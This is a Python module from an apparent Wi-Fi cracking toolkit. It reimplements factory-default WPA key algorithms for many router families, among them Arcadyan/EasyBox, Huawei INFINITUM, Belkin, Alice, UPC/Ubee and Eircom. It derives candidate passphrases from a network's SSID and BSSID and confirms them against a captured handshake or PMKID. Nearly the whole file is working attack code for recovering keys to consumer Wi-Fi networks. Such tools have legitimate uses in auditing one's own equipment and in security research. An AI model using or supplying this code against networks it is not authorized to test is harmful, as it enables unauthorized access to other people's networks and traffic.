"""Factory-default WPA/WPA2 passphrase recovery for router families whose default key is a public
function of the BSSID/ESSID. Candidates are confirmed against a captured 4-way handshake (or
PMKID) via ``crack.wpa_psk``, so a wrong guess is simply discarded -- the recovered key is proven,
never a guess. Pure and offline.

Algorithms reimplemented from published research and the Router Keygen reference
(github.com/routerkeygen), validated against its vectors (tests/crack/data/default_keys_vectors.json).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import re
from functools import partial
from typing import Callable, List, Optional, Tuple

from wifit3.crack import wpa_psk
from wifit3.crack.alice_table import ALICE_TABLE, PREINIT_CHARSET
from wifit3.crack.default_keys_data import TELETU_TABLE, UBEE_ALPHABET, UPC_PROFANITIES

Candidate = Tuple[str, str]  # (passphrase, family)

# 32-byte SHA-256 seed shared by the Alice (Italy) and Arnet/Pirelli key schedules.
_ALICE_SEED = bytes((0x64, 0xC6, 0xDD, 0xE3, 0xE5, 0x79, 0xB6, 0xD9, 0x86, 0x96, 0x8D, 0x34, 0x45,
                     0xD2, 0x3B, 0x15, 0xCA, 0xAF, 0x12, 0x84, 0x02, 0xAC, 0x56, 0x00, 0x05, 0xCE,
                     0x20, 0x75, 0x91, 0x3F, 0xDC, 0xE8))


def _norm_mac(bssid: str) -> str:
    """BSSID to 12 uppercase hex chars (no separators)."""
    return bssid.replace(":", "").replace("-", "").upper()


# ----- per-family generators (reimplemented from the published algorithms) --

def _arcadyan(mac: str, ssid: str) -> List[str]:
    """Arcadyan (Vodafone EasyBox / Arcor / some Livebox). Key is pure MAC arithmetic; a second
    candidate replaces every '0' with '1' (the firmware's known collision)."""
    if len(mac) != 12:
        return []
    c1 = str(int(mac[8:12], 16)).zfill(5)
    s7, s8, s9, s10 = (int(c1[i], 16) for i in (1, 2, 3, 4))
    m9, m10, m11, m12 = (int(mac[i], 16) for i in (8, 9, 10, 11))
    k1 = (s7 + s8 + m11 + m12) & 0x0F
    k2 = (m9 + m10 + s9 + s10) & 0x0F
    nib = [k1 ^ s10, k2 ^ m10, m11 ^ s10, k1 ^ s9, k2 ^ m11, m12 ^ s9,
           k1 ^ s8, k2 ^ m12, k1 ^ k2]
    wpa = "".join(f"{n:x}" for n in nib)
    out = [wpa.upper()]
    if "0" in wpa:
        out.append(wpa.replace("0", "1").upper())
    return out


_HUAWEI_T = {
    "a0": (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
    "a1": (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15),
    "a2": (0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8),
    "a3": (0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10),
    "a5": (0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12),
    "a7": (0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11),
    "a8": (0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4),
    "a10": (0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14),
    "a14": (0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11),
    "a15": (0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9),
    "n5": (0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14),
    "n6": (0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7),
    "n7": (0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6),
    "n11": (0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12),
    "n12": (0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9),
    "n13": (0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11),
    "n14": (0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10),
    "n31": (0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5),
}
_HUAWEI_KEY = (30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66)


def _huawei_infinitum(mac: str, ssid: str) -> List[str]:
    """Huawei INFINITUM (Telmex, LatAm). Each key nibble is a fixed XOR network over the MAC."""
    if len(mac) != 12:
        return []
    m = [int(c, 16) for c in mac]
    t = _HUAWEI_T
    ya = (t["a2"][m[0]] ^ t["n11"][m[1]] ^ t["a7"][m[2]] ^ t["a8"][m[3]] ^ t["a14"][m[4]]
          ^ t["a5"][m[5]] ^ t["a5"][m[6]] ^ t["a2"][m[7]] ^ t["a0"][m[8]] ^ t["a1"][m[9]]
          ^ t["a15"][m[10]] ^ t["a0"][m[11]] ^ 13)
    yb = (t["n5"][m[0]] ^ t["n12"][m[1]] ^ t["a5"][m[2]] ^ t["a7"][m[3]] ^ t["a2"][m[4]]
          ^ t["a14"][m[5]] ^ t["a1"][m[6]] ^ t["a5"][m[7]] ^ t["a0"][m[8]] ^ t["a0"][m[9]]
          ^ t["n31"][m[10]] ^ t["a15"][m[11]] ^ 4)
    yc = (t["a3"][m[0]] ^ t["a5"][m[1]] ^ t["a2"][m[2]] ^ t["a10"][m[3]] ^ t["a7"][m[4]]
          ^ t["a8"][m[5]] ^ t["a14"][m[6]] ^ t["a5"][m[7]] ^ t["a5"][m[8]] ^ t["a2"][m[9]]
          ^ t["a0"][m[10]] ^ t["a1"][m[11]] ^ 7)
    yd = (t["n6"][m[0]] ^ t["n13"][m[1]] ^ t["a8"][m[2]] ^ t["a2"][m[3]] ^ t["a5"][m[4]]
          ^ t["a7"][m[5]] ^ t["a2"][m[6]] ^ t["a14"][m[7]] ^ t["a1"][m[8]] ^ t["a5"][m[9]]
          ^ t["a0"][m[10]] ^ t["a0"][m[11]] ^ 14)
    ye = (t["n7"][m[0]] ^ t["n14"][m[1]] ^ t["a3"][m[2]] ^ t["a5"][m[3]] ^ t["a2"][m[4]]
          ^ t["a10"][m[5]] ^ t["a7"][m[6]] ^ t["a8"][m[7]] ^ t["a14"][m[8]] ^ t["a5"][m[9]]
          ^ t["a5"][m[10]] ^ t["a2"][m[11]] ^ 7)
    return ["".join(str(_HUAWEI_KEY[y]) for y in (ya, yb, yc, yd, ye))]


_BELKIN_CHARSETS = ("024613578ACE9BDF", "944626378ace9bdf")
_BELKIN_ORDERS = ((6, 2, 3, 8, 5, 1, 7, 4), (1, 2, 3, 8, 5, 1, 7, 4),
                  (1, 2, 3, 8, 5, 6, 7, 4), (6, 2, 3, 8, 5, 6, 7, 4))


def _belkin_key(mac8: str, charset: str, order: Tuple[int, ...]) -> str:
    return "".join(charset[int(mac8[o - 1], 16)] for o in order)


def _belkin(mac: str, ssid: str) -> List[str]:
    """Belkin: the last 8 MAC nibbles permuted through a fixed order and character map. The
    lowercase-SSID variant keys off MAC+1 and yields a few candidates."""
    if len(mac) != 12:
        return []
    if ssid.startswith("Belkin"):
        return [_belkin_key(mac[-8:], _BELKIN_CHARSETS[0], _BELKIN_ORDERS[0])]
    if ssid.startswith("belkin"):
        m = format(int(mac, 16) + 1, "x")
        out = [_belkin_key(m[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[0])]
        if not m.startswith("944452"):
            out.append(_belkin_key(m[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[2]))
            out.append(_belkin_key(m[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[3]))
            m2 = format(int(m, 16) + 1, "x")
            out.append(_belkin_key(m2[-8:], _BELKIN_CHARSETS[1], _BELKIN_ORDERS[0]))
        return out
    return []


def _intercable(mac: str, ssid: str) -> List[str]:
    """InterCable: 'm' + the MAC with its last octet incremented (two candidates)."""
    short, last = mac[:10], int(mac[10:12], 16)
    return [("m" + short + f"{(last + 1) & 0xFF:02x}").lower(),
            ("m" + short + f"{(last + 2) & 0xFF:02x}").lower()]


def _otebaud(mac: str, ssid: str) -> List[str]:
    """OTE (BAUD): the MAC prefixed with a zero nibble."""
    return ["0" + mac.lower()]


def _tpw4g(mac: str, ssid: str) -> List[str]:
    """TP-LINK 4G (TPW4G): fixed prefix + the last three MAC octets."""
    return ["8747" + mac[-6:].upper()]


def _wifimedia(mac: str, ssid: str) -> List[str]:
    """Wifimedia-R: the MAC with its last nibble zeroed, upper and lower case."""
    k = mac[:11].lower() + "0"
    return [k, k.upper()]


def _pldt(mac: str, ssid: str) -> List[str]:
    """PLDT (Philippines): PLDTMyDSL uses the tail MAC; PLDTHOMEFIBR the XOR-complemented tail."""
    if ssid.startswith("PLDTHOMEFIBR"):
        return ["wlan" + f"{int(mac[-6:], 16) ^ 0xFFFFFF:06x}"]
    return ["PLDTWIFI" + mac[-5:].upper()]


_PBS_CHARSET = "0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz"
_PBS_SALT = bytes((0x54, 0x45, 0x4F, 0x74, 0x65, 0x6C, 0xB6, 0xD9, 0x86, 0x96, 0x8D, 0x34, 0x45,
                   0xD2, 0x3B, 0x15, 0xCA, 0xAF, 0x12, 0x84, 0x02, 0xAC, 0x56, 0x00, 0x05, 0xCE,
                   0x20, 0x75, 0x94, 0x3F, 0xDC, 0xE8))


def _pbs(mac: str, ssid: str) -> List[str]:
    """PBS: SHA-256 over a salt and the MAC (last octet -5), mapped to a 13-char alphabet."""
    mb = bytearray.fromhex(mac)
    mb[5] = (mb[5] - 5) & 0xFF
    digest = hashlib.sha256(_PBS_SALT + bytes(mb)).digest()
    return ["".join(_PBS_CHARSET[digest[i] % len(_PBS_CHARSET)] for i in range(13))]


_EIRCOM_WORDS = ("Zero", "One", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight", "Nine")


def _eircom(mac: str, ssid: str) -> List[str]:
    """Eircom: SHA-1 over the tail MAC spelled out in English words plus a fixed phrase."""
    num = int(mac[-6:], 16) + 0x01000000
    words = ""
    while num > 0:
        words = _EIRCOM_WORDS[num % 10] + words
        num //= 10
    phrase = words + "Although your world wonders me, "
    return [hashlib.sha1(phrase.encode("latin-1")).hexdigest()[:26]]


def _wlan6(mac: str, ssid: str) -> List[str]:
    """WLAN6 (WLANXXXXXX): ten candidates from a fixed nibble network over SSID + MAC digits."""
    def _nib(ch: str) -> int:
        v = ord(ch)
        return ((v - 55) if v >= ord("A") else v) & 0xF

    sp = [_nib(c) for c in ssid[-6:]]
    bl = [_nib(mac[-2]), _nib(mac[-1])]
    out = []
    for i in range(10):
        aux = i + sp[3] + bl[0] + bl[1]
        aux1 = sp[1] + sp[2] + sp[4] + sp[5]
        b = [0] * 13
        b[1], b[5], b[9] = aux ^ sp[5], aux ^ sp[4], aux ^ sp[3]
        b[2], b[6], b[10] = aux1 ^ sp[2], aux1 ^ bl[0], aux1 ^ bl[1]
        b[3], b[7], b[11] = bl[0] ^ sp[5], bl[1] ^ sp[4], aux ^ aux1
        b[4], b[8], b[12] = b[1] ^ b[7], b[6] ^ b[10], b[2] ^ b[9]
        b[0] = b[11] ^ b[5]
        out.append("".join(f"{b[j] & 0xF:X}" for j in range(13)))
    return out


_SITECOM_CHARSET = "123456789abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ"


def _sitecom_key(mac: str) -> str:
    tail = mac[6:]
    j = 0
    while j < len(tail) and tail[j].isdigit():
        j += 1
    num = int(tail[:j]) if j else 0
    o = [ord(c) for c in mac]
    n = len(_SITECOM_CHARSET)
    prod = (
        (num + o[11] + o[5]) * (o[9] + o[3] + o[11]),
        (num + o[11] + o[6]) * (o[8] + o[10] + o[11]),
        (num + o[3] + o[5]) * (o[7] + o[9] + o[11]),
        (num + o[7] + o[6]) * (o[5] + o[4] + o[11]),
        (num + o[7] + o[6]) * (o[8] + o[9] + o[11]),
        (num + o[11] + o[5]) * (o[3] + o[4] + o[11]),
        (num + o[11] + o[4]) * (o[6] + o[8] + o[11]),
        (num + o[10] + o[11]) * (o[7] + o[8] + o[11]),
    )
    return "".join(_SITECOM_CHARSET[p % n] for p in prod)


def _sitecom(mac: str, ssid: str) -> List[str]:
    """Sitecom: an 8-char charset map of the MAC, tried lower, upper, and with the last nibble +1/+2."""
    out = [_sitecom_key(mac.lower()), _sitecom_key(mac.upper())]
    last = int(mac[11], 16)
    for _ in range(2):
        last = (last + 1) % 0x10
        out.append(_sitecom_key(mac[:11] + f"{last:X}"))
    return out


_ARNET_LOOKUP = "0123456789abcdefghijklmnopqrstuvwxyz"


def _arnet_key(mac: str, length: int) -> str:
    digest = hashlib.sha256(_ALICE_SEED + b"1236790" + bytes.fromhex(mac)).digest()
    return "".join(_ARNET_LOOKUP[digest[i] % len(_ARNET_LOOKUP)] for i in range(length))


def _alice_charmap(digest: bytes) -> str:
    return "".join(PREINIT_CHARSET[digest[i] & 0xFF] for i in range(24))


def _alice_italy(mac: str, ssid: str) -> List[str]:
    """Alice Italy (Alice-NNNNNNNN): per magic-table entry for the 3-digit group, SHA-256 over the
    serial and MAC. When the beacon MAC does not match the table's, the MAC is reconstructed from
    the SSID (the post-AGPF-4.5.0 scheme)."""
    entries = ALICE_TABLE.get(ssid[6:9])
    if not entries:
        return []
    ssid8 = ssid[-8:]
    mac_proc = mac if mac[:6] == entries[0][3] else entries[0][3]
    out: List[str] = []
    for serial, k, q, _mp in entries:
        serial_str = (serial + "X" + str((int(ssid8) - q) // k).rjust(7, "0")).encode("latin-1")
        if len(mac_proc) == 12:
            key = _alice_charmap(hashlib.sha256(_ALICE_SEED + serial_str + bytes.fromhex(mac_proc)).digest())
            if key not in out:
                out.append(key)
        eth = mac_proc[:6]
        for extra in range(10):
            calc = format(int(str(extra) + ssid8), "X")
            if eth[5] == calc[0]:
                eth += calc[-6:]
                break
        if eth == mac_proc[:6]:
            continue
        key2 = _alice_charmap(hashlib.sha256(_ALICE_SEED + serial_str + bytes.fromhex(eth)).digest())
        if key2 not in out:
            out.append(key2)
    return out


def _arnet_pirelli(mac: str, ssid: str) -> List[str]:
    """Arnet/Pirelli (Telecom Argentina, Portugal ADSL): SHA-256 over the MAC and nearby MACs; the
    ADSLPT variant truncates to 8 chars."""
    base = int(mac, 16)
    keys = [_arnet_key(f"{base + i:012x}", 10) for i in (0, -2, -1, 1, 2, 3, 4)]
    if ssid.startswith("ADSLPT-AB"):
        return [k[:8] for k in keys]
    return keys


def _alice_germany(mac: str, ssid: str) -> List[str]:
    """Alice Germany (ALICE-WLANxx): base64 of the first 12 hex of MD5 over the MAC-minus-one."""
    tail = (int(mac[6:12], 16) - 1) & 0xFFFFFF
    eth = (mac[:6] + f"{tail:06x}").lower()
    prefix = hashlib.md5(eth.encode("latin-1")).hexdigest()[:12]
    return [base64.b64encode(prefix.encode("latin-1")).decode("ascii")]


def _teletu(mac: str, ssid: str) -> List[str]:
    """TeleTu / Tele2 Italy: serial prefix + (tail MAC - base) / divider, per the magic range the
    MAC falls into (Pirelli-derived)."""
    entries = TELETU_TABLE.get(mac[:6])
    if not entries:
        return []
    macval = int(mac[6:], 16)
    out = []
    for lo, hi, serial, base, divider in entries:
        if lo <= macval <= hi:
            out.append(serial + "Y" + str((macval - base) // divider).rjust(7, "0"))
    return out


# "UPCDEAULTSSID" / "UPCDEAULTPASSPHRASE" as ASCII-hex, appended verbatim before the first MD5.
_UPC_SSID_HEX = "555043444541554C5453534944"
_UPC_PASS_HEX = "555043444541554C5450415353504852415345"


def _upc_md5_nibbles(mac6: bytes, suffix_hex: str) -> bytes:
    # Note the width-2 space-padded hex ("%2X") and the trailing NUL in each MD5 input.
    buf1 = ("".join(f"{b:2X}" for b in mac6) + suffix_hex).encode("latin-1") + b"\x00"
    low = hashlib.md5(buf1).digest()
    buf3 = ("".join(f"{low[i] & 0xF:02X}" for i in range(6))).encode("latin-1") + b"\x00"
    return hashlib.md5(buf3).digest()


def _upc_ssid(mac6: bytes) -> str:
    h = _upc_md5_nibbles(mac6, _UPC_SSID_HEX)
    return "UPC" + "".join(str(h[i] % 10) for i in range(7))


def _upc_pass(mac6: bytes) -> str:
    h = _upc_md5_nibbles(mac6, _UPC_PASS_HEX)
    raw = "".join(chr(0x41 + (h[i] + h[i + 8]) % 26) for i in range(8))
    if any(bad in raw for bad in UPC_PROFANITIES):
        return "".join(UBEE_ALPHABET[(h[i] + h[i + 8]) % 26] for i in range(8))
    return raw


def _upc_ubee(mac: str, ssid: str) -> List[str]:
    """UPC/Ubee (UPCxxxxxxx): the 2.4 GHz MAC is offset from the BSSID, so try a small window and
    keep the offsets whose generated SSID matches; the passphrase derives from the same MAC."""
    base = int(mac, 16)
    out = []
    for delta in range(-7, 5):
        mac6 = ((base + delta) & 0xFFFFFFFFFFFF).to_bytes(6, "big")
        if _upc_ssid(mac6)[:10] == ssid[:10]:
            pw = _upc_pass(mac6)
            if pw not in out:
                out.append(pw)
    return out


# BSSID-derived key flags (Router Keygen BssidKeygen/BaseXKeygen): the key is the MAC, sliced to a
# length, its low 3 bytes offset, and cased. These families differ only in (flags, offset).
_LEN12, _LEN10, _LEN8, _UC, _LC, _CUTLEFT = 1, 2, 4, 8, 16, 32


def _mac_offset_hex(last6: int, offset: int) -> str:
    v = last6 + offset
    return (format(v, "x") if v >= 0 else format(v & 0xFFFFFF, "x")).rjust(6, "0")[-6:]


def _bssid_transform(mac: str, flags: int, offset: int) -> List[str]:
    out: List[str] = []

    def cased(tmac: str) -> None:
        if flags & _UC:
            out.append(tmac.upper())
        if flags & _LC:
            out.append(tmac.lower())

    if flags & _LEN8:
        t = mac[:8] if flags & _CUTLEFT else mac[-8:]
        cased(t[:2] + _mac_offset_hex(int(t[-6:], 16), offset))
    if flags & _LEN10:
        t = mac[:10] if flags & _CUTLEFT else mac[-10:]
        cased(t[:4] + _mac_offset_hex(int(t[-6:], 16), offset))
    if flags & _LEN12:
        cased(mac[:6] + _mac_offset_hex(int(mac[-6:], 16), offset))
    return out


def _bssid_rule(mac: str, ssid: str, flags: int, offsets: Tuple[int, ...]) -> List[str]:
    out: List[str] = []
    for off in offsets:
        for key in _bssid_transform(mac, flags, off):
            if key not in out:
                out.append(key)
    return out


def _to_base(n: int, base: int) -> str:
    if n <= 0:
        return "0"
    digits = "0123456789abcdefghijklmnopqrstuvwxyz"
    out = ""
    while n:
        out = digits[n % base] + out
        n //= base
    return out


def _basex_rule(mac: str, ssid: str, flags: int, offset: int, base: int, nibbles: int) -> List[str]:
    res = _to_base(int(mac[-nibbles:], 16) + offset, base)
    out: List[str] = []
    for bit, length in ((_LEN8, 8), (_LEN10, 10), (_LEN12, 12)):
        if flags & bit:
            padded = res[:length] if len(res) >= length else res.rjust(length, "0")
            if flags & _UC:
                out.append(padded.upper())
            if flags & _LC:
                out.append(padded.lower())
    return out


# (family name, SSID matcher, MAC/SSID -> candidate passphrases)
_FAMILIES: Tuple[Tuple[str, "re.Pattern[str]", Callable[[str, str], List[str]]], ...] = (
    ("Arcadyan/EasyBox",
     re.compile(r"^(?:Arcor|EasyBox|Vodafone|WLAN)[- ][0-9A-Fa-f]{6}$|^Vodafone[0-9A-Za-z]{4}$"),
     _arcadyan),
    ("Huawei/INFINITUM", re.compile(r"^INFINITUM[0-9A-Za-z]{4}$"), _huawei_infinitum),
    ("Belkin", re.compile(r"^[Bb]elkin[._][0-9A-Fa-f]{3,6}$"), _belkin),
    ("InterCable", re.compile(r"^InterCable[0-9A-Fa-f]{6}$"), _intercable),
    ("OTE", re.compile(r"^OTE[0-9A-Fa-f]{4}$"), _otebaud),
    ("TP-LINK/TPW4G", re.compile(r"^TPW4G_[0-9A-Fa-f]{6}$"), _tpw4g),
    ("Wifimedia-R", re.compile(r"^wifimedia_R-[0-9A-Za-z]{4}$"), _wifimedia),
    ("PLDT", re.compile(r"^PLDT(?:MyDSL.*|HOMEFIBR_[0-9A-Fa-f]{6})$"), _pldt),
    ("PBS", re.compile(r"^PBS-[0-9A-Fa-f]{6}$"), _pbs),
    ("WLAN6", re.compile(r"^WLAN[0-9A-Fa-f]{6}$"), _wlan6),
    ("Eircom", re.compile(r"^eircom[0-9]{4} [0-9]{4}$"), _eircom),
    ("Sitecom", re.compile(r"^Sitecom$"), _sitecom),
    ("Arnet/Pirelli", re.compile(r"^(?:WiFi-Arnet-|ADSLPT-AB)[0-9A-Za-z]+$"), _arnet_pirelli),
    ("Alice Germany", re.compile(r"^ALICE-WLAN[0-9A-Za-z]{2,}$"), _alice_germany),
    ("Alice Italy", re.compile(r"^[aA]lice-[0-9]{8}$"), _alice_italy),
    ("TeleTu/Tele2", re.compile(r"(?i)^teletu"), _teletu),
    ("UPC/Ubee", re.compile(r"^UPC[0-9]{7}$"), _upc_ubee),
    # ----- BSSID-derived families (engine: _bssid_transform; params from the Router Keygen matcher)
    ("Claro", re.compile(r"^Claro-[0-9A-F]{4}$"),
     partial(_bssid_rule, flags=_UC | _LC | _LEN12, offsets=(0,))),
    ("Movistar", re.compile(r"^movistar_[0-9a-f]{6}$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(-9,))),
    ("OTE/conn-x/Megared/Wind",
     re.compile(r"^(?:OTE[0-9a-fA-F]{6}|conn-x[0-9a-f]{6}|Claro[0-9A-F]{4}|Megared[0-9a-f]{4}"
                r"|2KOM_[0-9a-f]{6}|Wind WiFi [0-9a-zA-Z]{6})$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(0,))),
    ("ZTE", re.compile(r"^ZTE-[0-9a-f]{6}$"),
     partial(_bssid_rule, flags=_LC | _LEN8 | _CUTLEFT, offsets=(0, 1))),
    ("Nemont/Maxcom/Djaweb",
     re.compile(r"^(?:Nemont|TURBONET|300NWLAN|DJAWEB_|Djaweb[0-9]{8}|MAXCOM[0-9a-zA-Z]{4}"
                r"|(?:PTV-|ptv|ptv-)[0-9a-zA-Z]{6})"),
     partial(_bssid_rule, flags=_UC | _LEN12, offsets=(0,))),
    ("netis/MGTS", re.compile(r"^(?:netis|MGTS_GPON_[0-9A-F]{4}|wi-fi[0-9]{4}|true_home2G_[0-9a-f]{3})$"),
     partial(_bssid_rule, flags=_LC | _LEN8, offsets=(0,))),
    ("MAXNET", re.compile(r"^MAXNET-[0-9A-Fa-f]{4}$"),
     partial(_bssid_rule, flags=_UC | _LC | _LEN8, offsets=(-2,))),
    ("Comtrend (BSSID)", re.compile(r"^Comtrend[0-9A-F]{4}$"),
     partial(_bssid_rule, flags=_UC | _LEN10, offsets=(-1,))),
    ("Orange", re.compile(r"^ORANGE-[0-9A-F]{4}$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(-6,))),
    ("FLOW", re.compile(r"^FLOW[0-9]{4}$"),
     partial(_bssid_rule, flags=_UC | _LEN12, offsets=(-2,))),
    ("Upvel", re.compile(r"^Upvel_?[0-9a-f]{4}$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(1, 2, 3))),
    ("AKADO", re.compile(r"^AKADO-[0-9A-F]{4}$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(-6,))),
    ("CIK", re.compile(r"^CIK[0-9]{4}$"),
     partial(_bssid_rule, flags=_LC | _LEN12, offsets=(-1,))),
    ("OPTIC", re.compile(r"^OPTIC[0-9a-fA-F]{4}$"),
     partial(_bssid_rule, flags=_UC | _LEN8, offsets=(-16,))),
    ("TeleRed/Ubee", re.compile(r"^(?:TeleRed-[0-9A-F]{4}|Ubee[0-9A-F]{4})$"),
     partial(_bssid_rule, flags=_UC | _LEN10, offsets=(-4,))),
    ("Singtel/TELMA", re.compile(r"^(?:Singtel[0-9]{4}-[0-9A-F]{4}|SINGTEL-[0-9A-F]{4}"
                                 r"|BoxByTELMA-[0-9A-F]{4})$"),
     partial(_basex_rule, flags=_LC | _LEN10, offset=-1, base=10, nibbles=6)),
)


def candidates(ssid: Optional[str], bssid: str) -> List[Candidate]:
    """Ranked, de-duplicated (passphrase, family) guesses for the AP, from every family whose SSID
    pattern matches. Empty when no family claims the SSID."""
    if not ssid:
        return []
    mac = _norm_mac(bssid)
    if len(mac) != 12:
        return []
    out: List[Candidate] = []
    seen = set()
    for name, pattern, gen in _FAMILIES:
        if not pattern.match(ssid):
            continue
        for psk in gen(mac, ssid):
            if psk and psk not in seen:
                seen.add(psk)
                out.append((psk, name))
    return out


# ----- verification against a real capture ---------------------------------

_MIC_OFFSET, _MIC_LEN = 81, 16


def _zero_mic(payload: bytes) -> bytes:
    if len(payload) < _MIC_OFFSET + _MIC_LEN:
        return payload
    return payload[:_MIC_OFFSET] + b"\x00" * _MIC_LEN + payload[_MIC_OFFSET + _MIC_LEN:]


def pmkid_for(psk: str, ssid: str, aa: bytes, spa: bytes) -> bytes:
    """The PMKID a station with this PSK would present: HMAC-SHA1(PMK, "PMK Name"||AA||SPA)[:16]."""
    return hmac.new(wpa_psk.pmk(psk, ssid), b"PMK Name" + aa + spa, hashlib.sha1).digest()[:16]


def recover(ssid: Optional[str], bssid: str, handshake) -> Optional[Candidate]:
    """First factory-default candidate that verifies against ``handshake`` (a models.Handshake):
    its 4-way MIC, else its PMKID. ``None`` if no family matches or none verifies."""
    cands = candidates(ssid, bssid)
    if not cands or ssid is None or handshake is None:
        return None
    from wifit3.crack.handshake import crackable_pairs
    from wifit3.dot11.mac import str_to_mac

    aa = str_to_mac(bssid)
    spa = str_to_mac(handshake.client_mac)
    pairs = crackable_pairs(handshake)
    pmkid = getattr(handshake, "pmkid", None)
    for psk, family in cands:
        for pair in pairs:
            anonce = pair.anonce_frame.nonce
            mic_frame = pair.mic_frame
            if wpa_psk.mic_for(psk, ssid, aa, spa, anonce, mic_frame.nonce,
                               _zero_mic(mic_frame.eapol_payload)) == mic_frame.mic:
                return psk, family
        if pmkid and pmkid_for(psk, ssid, aa, spa) == pmkid:
            return psk, family
    return None
